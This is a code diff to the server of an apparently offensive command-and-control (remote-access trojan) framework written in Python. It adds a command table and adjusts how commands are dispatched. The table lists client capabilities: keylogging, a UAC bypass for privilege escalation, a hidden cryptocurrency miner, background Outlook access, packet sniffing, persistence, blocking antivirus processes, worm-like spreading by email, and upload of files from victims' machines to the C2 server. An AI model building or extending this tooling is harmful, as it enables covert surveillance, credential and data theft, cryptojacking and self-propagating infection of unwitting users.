@@ -254,7 +254,112 @@ class C2():
             'tasks' : {
                 'method': self.task_list,
                 'usage': 'tasks [id]',
-                'description': 'display all incomplete tasks for a client (default: all clients)'}}
+                'description': 'display all incomplete tasks for a client (default: all clients)'},
+            'abort': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'abort execution and self-destruct',
+                'usage': 'abort'},
+            'cat': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'display file contents', 
+                'usage': 'cat <path>'},
+            'cd': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'change current working directory',
+                'usage': 'cd <path>'},
+            'escalate': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'attempt uac bypass to escalate privileges',
+                'usage': 'escalate'},
+            'eval': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'execute python code in current context',
+                'usage': 'eval <code>'},
+            'execute': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'run an executable program in a hidden process',
+                'usage': 'execute <path> [args]'},
+            'help': {
+                'method': self.help,
+                'description': 'show usage help for commands and modules',
+                'usage': 'help [cmd]'},
+            'icloud': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'check for logged in icloud account on macos',
+                'usage': 'icloud'},
+            'keylogger': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'log user keystrokes',
+                'usage': 'keylogger [mode]'},
+            'load': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'remotely import a module or package',
+                'usage': 'load <module> [target]'},
+            'ls': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'list the contents of a directory',
+                'usage': 'ls <path>'},
+            'miner': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'run cryptocurrency miner in the background',
+                'usage': 'miner <url> <user> <pass>'},
+            'outlook': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'access outlook email in the background',
+                'usage': 'outlook <option> [mode]'},
+            'packetsniffer': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'capture traffic on local network',
+                'usage': 'packetsniffer [mode]'},
+            'passive': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'keep client alive while waiting to re-connect',
+                'usage': 'passive'},
+            'persistence': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'establish persistence on client host machine',
+                'usage': 'persistence <add/remove> [method]'},
+            'portscanner': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'scan a target host or network to identify',
+                'usage': 'portscanner <target>'},
+            'process': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'block process (e.g. antivirus) or monitor process',
+                'usage': 'process <block/monitor>'},
+            'pwd': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'show name of present working directory',
+                'usage': 'pwd'},
+            'restart': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'restart the shell', 
+                'usage': 'restart [output]'},
+            'screenshot': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'capture a screenshot from host device',
+                'usage': 'screenshot'},
+            'show': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'show value of an attribute',
+                'usage': 'show <value>'},
+            'spread': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'activate worm-like behavior and begin spreading client via email',
+                'usage': 'spread <gmail> <password> <URL email list>'},
+            'stop': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'stop a running job', 
+                'usage': 'stop <job>'},
+            'upload': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'upload file from client machine to the c2 server',
+                'usage': 'upload [file]'},
+            'wget': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'download file from url', 
+                'usage': 'wget <url>'}        
+        }
 
         try:
             import readline
@@ -841,10 +946,16 @@ class C2():
                     output = ''
                     cmd, _, action = cmd_buffer.partition(' ')
                     if cmd in self.commands:
-                        try:
-                            output = self.commands[cmd]['method'](action) if len(action) else self.commands[cmd]['method']()
-                        except Exception as e1:
-                            output = str(e1)
+                        method = self.commands[cmd]['method']
+                        if callable(method):
+                            try:
+                                output = method(action) if len(action) else method()
+                            except Exception as e1:
+                                output = str(e1)
+                        else:
+                            util.display("\n[-]", color='red', style='bright', end=' ')
+                            util.display("Error:", color='white', style='bright', end=' ')
+                            util.display(method + "\n", color='white', style='normal')
                     elif cmd == 'cd':
                         try:
                             os.chdir(action)
@@ -1008,13 +1119,15 @@ class Session(threading.Thread):
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
-                        elif cmd in globals()['c2'].commands and cmd != 'help':
-                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
-                            if result:
-                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                globals()['c2'].display(result.encode())
-                                globals()['c2'].database.handle_task(task)
-                            continue
+                        elif cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
+                            method = globals()['c2'].commands[cmd]['method']
+                            if callable(method):
+                                result = method(action) if len(action) else method()
+                                if result:
+                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                                    globals()['c2'].display(result.encode())
+                                    globals()['c2'].database.handle_task(task)
+                                continue
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                             self.send_task(task)
